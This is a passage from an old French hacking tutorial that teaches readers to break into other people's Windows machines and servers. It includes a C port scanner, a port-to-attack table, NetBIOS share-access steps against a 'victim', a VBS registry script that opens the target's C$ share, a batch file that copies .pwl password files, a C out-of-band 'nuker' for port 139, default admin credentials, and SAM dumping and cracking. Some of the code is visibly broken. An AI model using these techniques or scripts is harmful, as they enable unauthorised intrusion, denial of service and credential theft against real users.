   addrSocket.sin_addr = *(struct in_addr*) serveur->h_addr;
/* Affichage du nom de la machine contenue dans la structure hostent */                                                                                                                                                                                                           
   printf("\n(scan sur %s)", serveur->h_name);
/* Déclaration de la boucle for, pour i=1, on incrémente 1 à i jusqu'à ce que i soit égal au nombre de ports */
   for(i=1;i<=nbredePorts;i++)
   {
/* Création de la socket en mode connecté sur TCP */
      fd = socket(AF_INET,SOCK_STREAM,0);
/* Initialisation du numéro de port en format réseau avec htons() */
      addrSocket.sin_port = htons(i);
/* Vérifie si la connection sur le socket a pu être établie. Si supérieur à zéro, alors la 
connection a réussi, sinon ca n'a pas marché :p */
      if(connect(fd,(struct sockaddr *)&addrSocket, sizeof addrSocket)>=0)
      {
/* Si la connection a réussi, on incrémente le nombre de ports ouverts */
       portsOuverts++;
/* Et on affiche le numéro du port ouvert */
       printf("\n%d : open", i);
      }     
/* On ferme notre socket */
      close(fd);
   }
/* Renvoie à la fonction main() le nombre de ports ouverts */
       return (portsOuverts);
}


/* Fonction main() */

/* Déclaration de la fonction */
int main()
{
/* Déclaration des variables */
char *nomduserveur;
int nbredePorts, PortsOuverts;

/* On demande à l'utilisateur de rentrer ses données */
printf("\n\n##### KefScan #####\n");
printf("   coded by [Kefka]\n");
printf("Tous droits reservés\n");
printf("\nEntrez l'adresse du serveur : ");
scanf("%s", nomduserveur);
printf("Combien de ports souhaitez vous scannez? ( max: 65535)");
scanf("%d", &nbredePorts);
if ((nbredePorts < 0) || (nbredePorts > 65535))
{
printf("\nIncorrect, retentez : ");
scanf("%d", &nbredePorts);
}

printf("\nVeuillez patientez, scan en cours......");
/* On fait appel à la fonction sockscan() qui va afficher les numéros de ports ouverts et 
renvoyer le nombre de ports ouverts */
PortsOuverts = sockscan(nomduserveur, nbredePorts);
/* Maintenant on affiche les résultats globaux du scan */
printf("\n\n\nScan termine !!!\n************\n");
printf("\nNombre de ports scannes : %d", nbredePorts);
printf("\nNombre de ports ouverts : %d", PortsOuverts);
return 0;
}
/* Fin du programme */

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Voici maintenant une petite liste des ports succeptibles d'être dangeureux, accompagnée dans
chaque cas du type de l'infiltration...

>>> nmap -I ip_cible

N° de port / Nom du service / Type du port /Type(s) d'attaques(s) possibles(s)
--------------------------------------------------------------------------------
20	     /    FTP-Data    /  TCP	       / Possibilité d'installer un sniffer       
21	     /    FTP	    /  TCP         / Buffer Overflow
                                             Dénis de service (DoS)
                                             Attaque brute-force
                                             Intrusion possible	
22	     /    SSH	    /  TCP	       / Buffer Overflow
                                             Attaque brute-force
                                             Intrusion possible
23	     /    Telnet      /  TCP	       / Buffer overflow
                                             Dénis de service (DoS)
                                             Attaqe brute-force
                                             Intrusion Possible
                                             Possibilité d'installer un sniffer
25	     /    STMP	    /  TCP	       / Buffer overflow
                                             Dénis de service (DoS)
                                             Mine d'information
                                             Intrusion possible 
43         /    Ipswitch    /  TCP         / Dénis de service (DoS)
                IMail 5.0 
                (Prog)		
53	     /    DOMAIN	    /  TCP/UDP     / Buffer overflow
                                             Dénis de service (DoS)
                                             Intrusion possible
69	     /    Trivial FTP /  UDP	       / Intrusion possible
70	     /    Gopher	    /  TCP         / Possibilité d'installer un sniffer   	
79	     /    Finger	    /  TCP         / Mine d'informarions	
80	     /    HTTP	    /  TCP         / Attaques CGI
                                             Buffer overflow
                                             Dénis de service (DoS)
                                             Mine d'informations
                                             Intrusion possible
                                             Possibilité d'installer un sniffer    
110	     /    POP3	    /  TCP         / Buffer overflow
                                             Dénis de service (DoS)
                                             Attaques brute-force
                                             Intrusion possible	
137	     /    NetBios ns  /  TCP/UDP     / Dénis de service (DoS)	
138	     /    NetBios dgm /  TCP/UDP     / Dénis de service (DoS)	
139	     /    NetBios ssn /  TCP/UDP     / Dénis de service (DoS)
                                             Attaques brute-force
                                             Intrusion possible
                                             Mine d'informations	
149	     /    IMAP	    /  TCP         / Buffer overflow
                                             Intrusion possible
389	     /    Ipswitch    /  TCP         / Buffer overflow
                IMail 5.0                    Intrusion possible
                (Prog)		               Dénis de service (DoS)
505	     /    pbbser      /  TCP         / Intrusion possible
                (Backdoor)		
513	     /    Rlogin	    /  TCP         / Possibilité d'installer un sniffer
                                             Intrusion possible	
555	     /    phAse Zero  /  TCP         / Intrusion possible
                (Backdoor)	
1243	     /    SubSeven    /  TCP         / Intrusion possible
                (Backdoor)		
2080	     /    Qbik WinGate/  TCP         / Dénis de service (DoS)
                3.0 (Prog)		
2140,3150  /    DeepThroat  /  UDP         / Intrusion possible 
               1,2 & 3 
               (Backdoor)		
3389	     /    Microsoft   /  TCP         / Dénis de service (DoS)
                Windows NT 
                Terminal 
                Server 		
5631	     /    PCAnywhere32/  TCP         / Dénis de service (DoS)
                (Prog)		
6000	     /    X Server    /  TCP         / Possibilité d'installer un sniffer
                                             Intrusion possible	
6549	     /    APC         /  UDP         / Dénis de service (DoS)
                PowerChute 
                PLUS (Prog)		
6969	     /    GateCrasher /  TCP         / Intrusion possible
                1.2 (Backdoor)		
8080       /    HTTP	    /  TCP         / Attaques CGI
                                             Buffer overflow
                                             Dénis de service (DoS)
                                             Mine d'informations
                                             Intrusion possible
8181	     /    Ipswitch    /  TCP         / Dénis de service (DoS)
                IMail 5.0 
                (Prog)		
8383       /    Ipswitch    /  TCP         / Dénis de service (DoS)
                IMail 5.0 
                (Prog)	

10067      /    Portal of   /  UDP         / Intrusion possible 
                Doom   
                (Backdoor)	
10167      /    Portal of   /  UDP         / Intrusion possible
                Doom 
                (Backdoor)	
12345      /    NetBus      /  TCP         / Intrusion possible
                (Backdoor)	
14238	     /    HotSync     /  TCP         / Buffer overflow 
                Manager 3.0.4 
                (Prog)		
17300	     /    kuang2v     /  TCP         / Intrusion possible   
                (Backdoor)		
20034	     /    NetBus 2.0  /  TCP         / Intrusion possible
                (Backdoor)		
21554      /    GirlFriend  /  TCP         / Intrusion possible
                1.3x 
                (Backdoor)		
23456	     /    EvilFTP     /  TCP         / Intrusion possible
                (Backdoor)	 
26092	     /    QIB         /  TCP         / Intrusion possible
                (Backdoor)	
27374      /    SubSeven    /  TCP         / Intrusion possible
                (Backdoor)
30100	     /    NetSphere   /  TCP         / Intrusion possible
                1.30 
                (Backdoor)	
30102	     /    NetSphere   /  TCP         / Intrusion possible
                1.30 
                (Backdoor)	
31337	     /    Back Orifice/  TCP         / Instrusion possible
                (Backdoor)	
31457      /    Tetrinet    /  TCP         / Dénis de service (DoS) 
                (Prog)		
31785	     /    Hack'a'Tack /  TCP         / Intrusion possible
                (Backdoor)	
31789      /    Hack'a'Tack /  UDP         / Intrusion possible
                (Backdoor)	
31791	     /    Hack'a'Tack /  UDP         / Intrusion possible
                (Backdoor)	
46256	     /    ANTI-prym/  /  TCP         / Intrusion possible
                h4g1s 
                (Backdoor)	



Voilà donc, nous reparlerons de ces vulnérabilités dans un prochain chapitre, 
patience ! Le chapitre tire presque à sa fin ...



d) O.S fingerprint

La technique de l'o.s fingerprint consiste à detecter le système d'exploitation
qu'utilisent les serveurs dans un réseau.
Le meilleur moyen, d'après moi, c'est avec nmap, mais il faut avoir Linux.
Nmap est disponible sur www.insecure.org (qui est par ailleurs un excellent site
de hacking !!!). Bon, on vient de voir que nmap pouvait nous servir pour effectuer
un balayage systèmatique des ports, et bien il est également très utile pour détecter
les systèmes d'exploitation...

La commande à taper, sous un shell Linux je rapelle ;)) , sera celle-ci :
>>> nmap -p80 -O ip_serveur
Un balayage des ports s'effectuera donc sur ip_serveur, et en bas qu'est ce qu'on
voit ? Chouette, le système d'exploitation de la bécane scannée !

Bon, sinon pour les malheureux qui n'ont pas Linux chez eux, une connection
par telnet ou par ftp sur le serveur cible vous donnera peut être de précieux
indices, tout de fois bien sûr si le serveur daigne se présenter à vous...
La technique de l'O.S fingerprint est très pratique à partir du moment où on cherche
à exploiter des failles en fonction du système d'exploitation du serveur... ;)



e) Conclusion

Ca y'est t'as réussi à choper des infos sur le site que tu veux hacker ?
Yes, t'es bien un hacker, tu cartonnes mec !!!
Mais maintenant, va falloir se servir des informations que tu as récupéré pour 
pouvoir le hacker ce putain de site !!! Comment faire ? C'est justement ce que
j'explique dans le chapitre précédent, allez du nerf, courage !!!


Alors, je vous propose dans un premier temps d'étudier le hacking windows, 9x
et NT (ces o.s sont entièrement différents l'un de l'autre), puis dans un second
temps, le hacking linux, avec tout le bordel qui s'en suit...

Vous prêts ? Nous commencons...

       _
      | |
      | |
      | |
      | |           
      } {           And now, ladies and gentlemen...
  ____| |___        
  \        /
   \      /
    \    /
     \  /
      \/
      




CHAPITRE 3, où le père KefKa pète un cable pour de bon
  [ windows hacking ]


Bon, alors on va commencer par quelque chose de pas très compliqué huh, je sais
que tout ce qui va suivre, c'est du déjà vu, du reservé au lammerz, etc...
Ben faut me comprendre, si je veux être le plus exhaustif possible en parlant
du hacking sous windows, faudra bien que je cite le mot "trojan" quelque part, 
connu ou pas connu... Bon, sur ce on y va, et si vous voulez VRAIMENT faire du
"hacking", reportez vous plutôt au chapitre sur le piratage de linux.
Ces méthodes nécessitent donc que le serveur cible ait le port 139 ouvert, donc
qu'il soit sous Windows...



&&&&&&&&&&&&&&&&&&&&
& 1. Win9X HacKing &
&&&&&&&&&&&&&&&&&&&&


a) Les trojans

Berkkk, je sens que ce chapitre va être vite balancé, si je commence à parler
de ça... En gros un trojan est une sorte de bestiole, qui se décompose en deux
voir trois partie, un client et un serveur, le serveur étant à installer sur la 
machine de la victime.

Exemple, le cheval de troie SubSeven, grand classique des lammers 
(http://www.subseven.slack.org)

Il se décompose en trois partie executables :
- SubSeven.exe : ça c'est la partie client, à garder pour nous.
- Server.exe , ça c'est la partie serveur (ah bon ???!!), qui va infecter la victime.
- Editserver.exe, ça c'est un programme qui peut nous servir si nous voulons par exemple, 
mettre un mot de passe sur le serveur, etc...

En fait, SubSeven est un très mauvais exemple pour hacker des serveurs, je vous conseille
donc plutôt Back Orifice (http://www.cultdeadcow.com).

Le trojan en lui même fait deux choses :
- Il transforme la machine cible en serveur.
- Il ouvre un port sur la machine cible, et donne donc accès à la machine attaquante.
Exemple : Port de Sub7 = 27374 ; Port de Back Orifice = 31337

Une fois connecté au moyen de Back Orifice sur le port 31337 d'un serveur quelconque,
tout nous est permis :) !
Encore faudrait il que le serveur ait le port 31337 d'ouvert, et pour cela il 
faudrait déjà qu'un hacker, apparement plus expérimenté que vous, ait placer le
serveur de B.O sur le serveur...

Donc, voilà, mais ne vous considerez pas pour autant hacker, ou même newbie, si vous
utiliser des trojans pour satisfaire votre soif... Les trojans sont lames, même
un gamin de 8 ans pourrait vous hacker avec ça... Tsss ces gosses....  ;)



b) Netbios

Je sais, Netbios, ça été lu, relu, re-relu et re-re-relu encore une fois...
Mais comprenez moi, il n'existe pas beaucoup de méthodes pour hacker un serveur Windows...

Cette méthode, reposant sur le protocole NETBEUI, reposant lui même sur NetBios, vous permettra
d'avoir accès au disque dur du serveur cible, en deux trois commandes, on regarde...

Faut juste disposer de windows. Ouvrez un shell dos (demarrer/executer/command.com) et faites :

>>> NBTSTAT -A ip_serveur_bidon

Une liste de noms de pc devrait s'afficher (si ce n'est pas le cas changez de cible, 
elle n'a pas Netbios), exemple:

NetBIOS Remote Machine Name Table
 Name          Type          Status
--------------------------------------------------
MONORDINATEUR <00> UNIQUE Registered
MONGROUPE     <00> GROUP  Registered
MONORDINATEUR <03> UNIQUE Registered
MONORDINATEUR <20> UNIQUE Registered
MONGROUPE     <1E> GROUP  Registered
MAC Address = 44-45-53-54-00-00

Bon, alors, ce qui nous interesse, c'est le nom de pc avec UNIQUE et <20> devant. Si ce nom 
existe le tour est (presque) joué. Nous allons editer le fichier lmhost.sam , qui convertit 
les de machines sous NETBEUI en adresses ip. Toujours sous DOS, tapez:

>>> edit c:\windows\lmhost.sam

Une fois dans le beau menu d'édition ms-dos, vous reste plus qu'à donner les informations
relatives au serveur cible, exemple :

>>> ip_serveur MONORDINATEUR #PRE

L'ip de votre victime, suivi du nom de son pc (celui avec UNIQUE et <20> devant) et 
de #PRE, qui indiquera que la correspondance entre l'ip et le nom NetBIOS devra passer
avant la résolution DNS. Maintenant, nous allons charger le fichier lmhost.sam. 
Sauvegarder le, quitter l'éditeur et toujours sous DOS, tapez:

>>> NBTSTAT -R

Et normalement, sauf erreur, vous obtenez:

Successful purge and preload of the NBT Remote Cache Name Table

Maintenant sortez de DOS aller dans Démarrer/Rechercher/Ordinateur Distant/puis entrez le nom 
du pc de la victime. Double cliquez sur son poste de travail et le tour est joué !!!

Ou alors, si vous aimez les complications, restez sous DOS et tapez:
>>> NET VIEW \\MONORDINATEUR
Une liste de noms de ressources partagées s'affichera. Allez donc faire un petit tour sur 
le C... niark niark... Tapez:
>>> NET USE \\MONORDINATEUR\C
Et le disque dur de votre victime deviendra un de vos disques libres...

Le problème majeur quand à l'utilisation de cette technique est que elle ne
marche que très rarement... Je vous propose donc un petit script en vbs qui
activera le partage des imprimantes et des fichiers de la victime :

Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Flags",770, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Parmlenc", 6837, "REG_BINARY"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Parm2enc", 0, "REG_BINARY"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Path", "C:\"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Remark",""
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Type", 0, "REG_DWORD"


De toute évidence, une fois connecté à une machine Windows 9x, tous les droits vous
sont permis. En effet, Windows n'est pas un système multi-utilisateurs, on est pas
sous nunux là ;) . Place à la suite... 



c) Les attaques locales

Ces attaques nécessitent un accès physique au système, car si vous arrivez à
vous connecter sur la machine cible au moyen d'un trojan ou de netbios, vous
jouirez de tous les droits, inutile donc de vous expliquer comment passer admin...

Bon, j'arrête le bla-bla... 
La méthode la plus utilisée, et la moins technique (mais qui marche encore très souvent)
consiste à un simple redemarrage du système. Si celui-ci est mal configuré, en cliquant
sur le bouton annuler, vous aurez ainsi accès à la quasi-totalité du système !
Et là, à vous la belle vie, luxe, calme et salsifis...

Egalement une bonne méthode pour avoir accès au disque dur du système, c'est de passer
par internet explorer. La machine en est certainement équipée, regardez mieux :)) .
Dans la barre d'internet explorer, donc, il me suffit de taper comme adresse :

file:///C|/   ou mieux encore : c:\ tout court :)
Cela vous donnera donc accès au lecteur, ici c:\, le disque dur...

Une fois que vous aurez un accès sur le disque dur, l'idée qui vous passera
en premier par la tête sera sans doute celle d'avoir un compte admin...
Pour cela, il vous faudra mettre la main sur les fichiers *.pwl, qui rassemblent
les mots de passe windows de tous les utilisateurs...
Pour cela, on peut imaginer un fichier batch contenant le code suivant :

@echo off
REM *** CopyPwl.bat, by KefKa ***
echo Bonjour, ce programme va copier les fichiers *.pwl du pc sur une disquette
echo Veuillez inserer une disquette, quand vous serez pret appuyez sur une touche
pause
echo Copie des fichiers en cours...
copy c:\windows\*.pwl a:
echo Termine, vous pouvez retirer la disquette du lecteur
echo Aurevoir

Bien sûr, on aurait pu juste passer en mode ms-dos et taper copy c:\windows\*.pwl a:
mais je trouve cette méthode beaucoup plus présentable... lol

Une fois les fichiers *.pwl dans votre poche (si vous avez mis la disquette dans
votre poche :p), retournez en lieu sûr et examinez de plus près ces fichiers pwl...
Malheur... Ils sont cryptés.
Indecryptables à main nue, on va donc faire appel à un décrypteur pwl (logique non ?)
On peut par exemple, faire appel à pwltool, disponible sur http://www.webdon.com 
ou à Cain, trouvable sur http://www.confine.com

Donc, une fois le mot de passe de l'administrateur en poche, on revient sur la machine cible,
et on se loggue en tant qu'admin, voilà.
Devenir admin sur le réseau lan de mon bahut m'a pris 5 minutes, à vous de faire mieux...



d) Dénis de service pour win9x

Un dénis de service, ou d.o.s, dans le contexte windaubien, consiste à envoyer 
une foulée de paquet de données sur les ports d'une machine, afin d'en provoquer
la déconnection. Bref, encore un bon truc lame. Cependant, nous verrons plus
tard comment ces d.o.s pourront devenir utiles, sur d'autres systèmes, je pense
par exemple à winNT ou a Linux.

Le d.o.s sous win9x, c'est le nuke. 
Appellons un chat un chat, nuke=lamming, nuker quelqu'un n'a rien
d'extraordinaire et ne requiert aucune capacité quelconque en informatique.

Le nuke est vraiment la chose la plus stupide qui puisse exister, et au lieu de vous
citer les principaux "nukers", nous allons étudier le code source d'un nuker.


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

/*******************************/
/* FuckLammah, coded by KefKa */
/*** nickairmax@caramail.com ***/
/****** irc.jeuxvideo.com ******/
/*******************************/

#include <stdio.h>             
#include <string.h>
#include <winsock.h>                   /* La librairie des fonctions TCP/IP */

int x, s;                              /* Déclaration des variables de portée globale */
int nukeport = 139;                    /* Le port du méfait... */
char *str = "FuckLammah";         /* str est le pointeur de type char qui va nous
servir à nuker la machine de la victime, voir plus bas ... */                
struct sockaddr_in addr;               /* Nos indispensables structures de socket */
struct hostent *host;

int sockedit(int sock, char *server, short port)          /* Fonction sockedit */
{
struct sockaddr_in blah;
struct hostent *he;
memset((char *)&blah,'0', sizeof(blah));

blah.sin_family=AF_INET;                     /* Initialisation des structures */
blah.sin_addr.s_addr=inet_addr(server);
blah.sin_port=htons(port);

if ((he = gethostbyname(server)) != NULL) 
   {
      memcpy((char *)&blah.sin_addr, he->h_addr, he->h_length );
   }

else if ((blah.sin_addr.s_addr = inet_addr(server)) < 0)  /* Ca, c'est au cas où l'host
      n'existerait pas */
         {
            printf("Impossible de transformer le nom de domaine en adresse IP");    
            return(-1);
         }
     
        /* Tentative de connection de la socket */
if (connect(sock,(struct sockaddr *)&blah,16)== -1) 
   {  /* Au cas où la connection ne marcherait pas */
      printf("Impossible de se connecter à l'ordinateur");
      closesocket(sock);
      return(-1);
   }

     /* Au cas ou la connection fonctionnerait ! lamer rulez */
printf("Connection en cours sur %s, port %d.\n", server, port);
return 0;
}


int main(void)          /* Fonction principale */       
{
WSADATA wsaData;                        /* Initialisation de winsock */
WORD wVersionRequested = MAKEWORD(1, 1);
wVersionRequested = MAKEWORD(1, 1); 

if ((int err = WSAStartup(wVersionRequested, &wsaData)) != 0 ) 
   {   
      printf("Impossible d'initialiser Winsock");
      exit(0);
   }

if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
   { 
      printf("%d ", WSAGetLastError());
      perror("socket()");
      exit(-1);
   }

printf("FuckLammah \n coded By KefKa");
printf("\n\nEntrez l'ip de la victime : ");
scanf(" %d", ip);
sockedit(s, ip, nukeport);     /* Appel de la fonction sockedit */                   
printf("Nuke en cours...");
send(s, str, strlen(str), MSG_OOB);   /* En réalité c'est cette ligne de code
qui provoque le nuke */
printf("%s is nuked\n", server);
closesocket(s);
}


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Voilà donc nous avons vu que le nuke était commandé par la fonction send, qui envoie
donc une chaîne de caractères, ici "FuckLammah" sur le port 139 d'une socket 
distante, placée sur la machine cible. 
Pour quelqu'un habitué à la programmation réseau, il n'y a rien de plus facile.
Non seulement nuker quelqu'un, c'est easy, mais en plus conçevoir un nuker,
c'est pas plus compliqué !!! 
Après on va s'étonner que le nuke, c'est du lame...

Mais passons plutôt à du hacking un peu plus balèze, sur une plate-forme winnt...



&&&&&&&&&&&&&&&&&&&&
& 2. WinNT HacKing &
&&&&&&&&&&&&&&&&&&&&


a) Les attaques à distance

Une attaque de serveur winNT se décompose en deux phases :
- On tente une attaque locale pour accèder au contenu du serveur
- On tente d'usurper le compte administrateur = attaque locale

Ici, nous allons étudier les attaques à distance ;
qui nous serviront à se forger un accès sur le serveur.

Première chose à faire, essayer de voir si le système n'est pas infecté par un trojan,
comme ce ne sera certainement pas le cas, vous pouvez également tenter une connection
via NBTSTAT sur le serveur, cela ne marchera certainement pas non plus.

Le recensement sous winnt se fait par la commande net view, comme ceci :
>>> net view \\ip_serveur



1. La divination de mots de passe

Une technique encore très en vogue, que j'ai plus ou moins
nommé la "divination de mots de passe", consiste à determiner le mot de passe d'un login
existant, en s'aidant d'une éventuelle mauvaise configuration du système.
Sous winNT, il existe plusieurs ressources partagées, et c'est au moyen de ces
ressource que nous allons chercher les mots de passe, via la commande net use.

On ouvre donc un invite ms-dos, puis on tape :
>>> net use \\ip_serveur\IPC$ * /user:Administrateur

L'astérisque * au lieu du mot de passe aménera le système à nous en demander
un. Quand à IPC$, cela correspond à la ressource partagée que nous avons utilisé,
ici il s'agit de Interprocess Communications.
Nous aurons également pu mettre C$ ou ADMIN$ à la place, mais IPC$ est plus probable...

Bon, c'est bien gentil tout ça, mais moi je n'ai aucune idée du mot de passe !!!

C'est là que nous entrons en jeu. 
Voici une liste de combinaisons login/passwd fortement probables :

--------------------------------------------------
Login              :                      Password
--------------------------------------------------
Administrator      :  aucun,password,administrator
Administrateur     :  aucun,password,administrator
Arcserve           :               arcserve,backup
Backup             :                        backup
Backupexec         :                        backup
Lab                :                  lab,password
Root               :                 root,password
Symbiator          :               symbiator,as400
Test               :                 test,password
Tivoli             :                        tivoli
Username           :     username,usr,company_name
--------------------------------------------------
  [(Liste tirée de http://securityparadigm.com)]


Malgrès les apparences, cette technique est très efficace
pour avoir accès au système. 
Et, ne dit-on pas, un accès local équivaut à un accès racine, humm ?



2. Les buffer overflow

C'est sans doute la manière la plus populaire et la plus efficace pour hacker,
aussi bien les serveurs Windows que les serveurs UNIX...
Le buffer overflow, ou debordement de tampon, se produit quand un programme ne
vérifie pas correctement les entrées en terme de longueur. Toute entrée 
imprévue risque de déborder sur la pile d'execution CPU. Et cette entrée
peut servir à executer du code choisi au préalable. 
Ce code, apellé shellcode
ou oeuf, est en fait un code en c décompilé qui produit quelque chose de bien
précis, il y'a plusieurs types de shellcode, celui qui vous donne un shell root,
celui qui binde un shell sur un port, etc...
Nous aurons l'occasion de revenir sur ces buffer overflow et sur ces shellcodes
un peu plus tard, lorsque nous parlerons du hacking UNIX.

Le buffer overflow a été découvert dans la fin des années 80, pour finalement
apparaître au "grand public" en 1996, suite à la parution d'un article
extrémement célèbre d'Aleph1, dans Phrack Issue 49, volume 7, fichier 14,
intitulé "Smashing the stack for fun and profit", mettant au grand jour
le principe des dépassement de tampon bien sûr, mais aussi les différents
processus de création et d'optimisation d'un shellcode.
Cet article a toujours son heure de gloire, et il est consultable sur
http://www.phrack.org . Une très bonne adaptation française lui a été
consacré dans FrHack, issue numéro 3, cet article a été rédigé par klog
en 1997, son nom : "L'exploitation du suid par l'homme" . Comique avec ça...

Vous l'aurez donc compris, les buffer overflow sont toujours d'actualité,
et ils constituent désormais une véritable science à part, très peu accessible,
leur écriture et leur étude font maintenant partie intégrante du hacking,
on pourrait même dire que bof = hacking, tant cette méthode est utilisée de
nos jours... (Mais au fait c'est quoi le hacking ???? :p)

Ce genre d'exploit se trouve très facilement sur la toile. 

Quelques liens :

http://www.phrack.org
http://www.isecurelabs.com
http://www.insecure.org
http://www.securityfocus.com
http://www.securitybugtraq.com


On va pas tarder à en reparler... Please wait...



b) Les attaques en local

Bon, on a assez parlé des attaques remote, à partir de maintenant on va supposer
que vous ayez obtenu un accès sur le système. Votre prochain objectif sera donc
d'acquérir le statut administrateur sur le serveur, chouette n'est ce pas ? lol
Nous n'allons pas ici reparler des buffer overflow, même si les attaques de ce
type font des ravages en local (comme en remote d'ailleurs :p ).
On va donc utiliser, ou plutôt étudier, les attaques traditionelles en local.



1. Getadmin et sechole

Getadmin et sechole sont deux programmes qui devraient pouvoir vous ajouter
au groupe des administrateurs, ils utilisent cependant deux méthodes différentes.
Getadmin utilise un sous-programme NT de bas-niveau pour définir une balise
qui autorise l'accès à tout processus en cours, puis injecte du code dans un
des processus en cours, qui possède le droit d'ajouter des utilisateurs au groupe
Administrateur. Ce processus est finalement renommé "winlogon".
Il faut savoir que ce programme ne marchera que si vous possèdez un droit d'accès
déjà élevé, backup par exemple.
Sechole, quand à lui, modifie les instructions placées dans la mémoire d'appel
à l'API OpenProcess, de sorte qu'il puisse se connecter à un processus d'attribution
des droits, après quoi il execute du code sur ce processus, permettant d'ajouter
le nom d'utilisateur en cours au groupe très fermé des Administrateurs...
C'est pareil que pour getadmin, faut que vous ayez un droit d'accès élevé.



2. SAM Hacking

Non, non, on ne va pas parler ici de l'oncle Sam (au passage j'emmerde tous
ces crétins de pro-américanistes primaires non américains ; être patriotiste
d'une nation auquel on appartient pas, je trouve ça totalement stupide, grrr
enfin passons...), mais plutôt du gestionnaire des comptes de sécurité (SAM).
La toucbe finale dans le hack d'un système NT est certainement le piratage de
celui-ci, qui va nous permettre d'obtenir les mots de passe de TOUS les 
utilisateurs du réseau... Cette technique implique tout d'abord que vous 
disposez d'un compte Administrateur, obtenu au moyen des différentes méthodes
décrites tout à l'heure. Bon, au boulot.

Le SAM, c'est un peu comme le etc/passwd sous Linux, il est bien entendu crypté...
Notre attaque va donc se diviser en deux phases :
1. Obtention du SAM
2. Décryptage de celui-ci

Obtenir le SAM. Il est situé dans le repertoire %systemroot%\system32\config
et malheuresement inaccessible tant que WinNT est activé. La clé qui
correspond dans la base de registre est HKEY_LOCALMACHINE\SAM , mais elle
est inaccessible, même avec un accès administrateur.
Pour obtenir le sam, on fera appel à pwdump, 
disponible sur http://razor.bindview.com/tools/desc/pwdump2_readme.html
Pwdump utilise la technique de l'injection dll qui va convertir dans la
base de registre les mots de passe dans un format genre etc/passwd.
Vous devrez donc executer pwdump en local sur le système cible, et les
mots de passe serons à vous...

Décryptage du SAM. Les mots de passe du sam sont cryptés exactement que comme
sous UNIX. Vous devrez donc utiliser un brute force cracker, tel L0phtCrack
ou John the Ripper, pour procéder au décryptage.
Cette phase est la plus fastidieuse car elle requiert assez de patience, trouver
le bon mot de passe à partir d'une liste de mots est une opération qui peut
prendre beaucoup de temps.

Il existe néammoins plusieurs méthodes pour procéder au piratage du SAM, que
je ne pourrais pas vous expliquer ici faute de temps et de place (d'interêt aussi...)

A noter que la seule manière de protéger efficacement un SAM, c'est de mettre
en place des mots de passe incrackable, composé de caractères alpha-numérique
et de symbole, tel que : 5za621d#17~8  , même le dernier cracker à la mode ne
pourra pas décrypter un mot de passe composé de cette manière, :)
Soyez donc prudents...



&&&&&&&&&&&&&&&&&
& 3. Conclusion &
&&&&&&&&&&&&&&&&&

Nous avons donc vu à travers ce chapitre les différentes manières de pirater
un système Windows... Et question sécurité ? Malgrès que Windows est un système
très critiqué, en raison par exemple de son code source non consultable, on peut
tout de même reconnaître que, au niveau sécurité, Windows est certainement mieux
que Linux, car beaucoup moins compliqué.
Donc, si vous voulez devenir in-hackable, installez Windows, choisissez des
mots de passe compliqués, interdisez les connections anonymes, ne laissez
pas un compte sans mot de passe, installez et configurez un firewall, surveillez
vos ports, n'executez jamais des programmes non-certifiés, et ne vous laissez
jamais abuser par des techniques telles que le Social Engeneering, on n'en a parler
ici car je pense que cela n'a pas grand chose à voir avec le 'vrai' hacking 
En deux mots le S.E consiste à exploiter les faiblesses du serveur, au niveau de son 
personnel, afin d'obtenir via une conversation télephonique quelques informations 
intéressantes, des mots de passe par exemple ;) ; Le Reverse S.E aussi consiste à la 
même chose, à la différence qu'il vous place dans une situation d'infériorité par 
rapport au personnel, et le pire, c'est que ça marche super bien !!! 
Bon, mieux vaut avoir la tchatche, plus fort que Jamel en scène huh !)
Heuuu je crois que je me suis un peu égaré là, ahem...

Maintenant nous allons passer du coq à l'âne (mais juste en matière de sécurité !!!),
c'est à dire de Windows à Linux, en espérant que vous allez tenir le coup...






          	     UU    UU   NN    NN   ii   XX    XX 
		     UU    UU   NNN   NN   ii    XX  XX
		     UU    UU   NN N  NN   ii     XXXX
		     UU    UU   NN  N NN   ii     XXXX 
 		      UU  UU    NN   NNN   ii    XX  XX
  		       UUUU     NN    NN   ii   XX    XX   



CHAPITRE 5, smashing unix system for fun and profit
  [ unix hacking ]


UNIX... Le système d'exploitation des programmeurs, des administrateurs et des hackers.
Des programmeurs car il intégre un compilateur permettant de programmer en c, c++, pascal,
delphi, scripting, assembleur, etc... Des administrateurs car unix est un système
multi-utilisateurs parfaitement adapté au monde des réseaux. Des hackers enfin, car
dieu sait si unix est si mal sécurisé... Obtenir un accès racine sur un système unix
provoque une joie si intense, si émouvante (... [évasion lyrique] ...) .
Enfin bref, c'est toujours un plaisir d'exploiter des faiblesses de sécutité dans ce
système, c'est même souvent facile, et comme les serveurs sont pratiquement tous équipés
de linux, internet constitue un vrai paradis pour tous les hackers en herbe...
So goooooood, alors on commence. :@-)  ( <--- meuhhhh)


a) Introduction

Bienvenue dans le monde fabuleux de l'unix.
Les techniques qui vont suivre demandent que vous ayez vous même en votre
possession une machine tournant sous linux, peut importe si c'est une debhian,
une mandrake ou une red hat, pour hacker ca revient au même.

J'attend tout de même de vous que vous connaissiez quelques commandes unix.
Nous allons déjà voir les bases qui nous seront nécessaires pour poursuivre
nos opérations héhéhé ...


1. Le compilateur gcc

Bon, on va déjà voir le compilateur gcc.
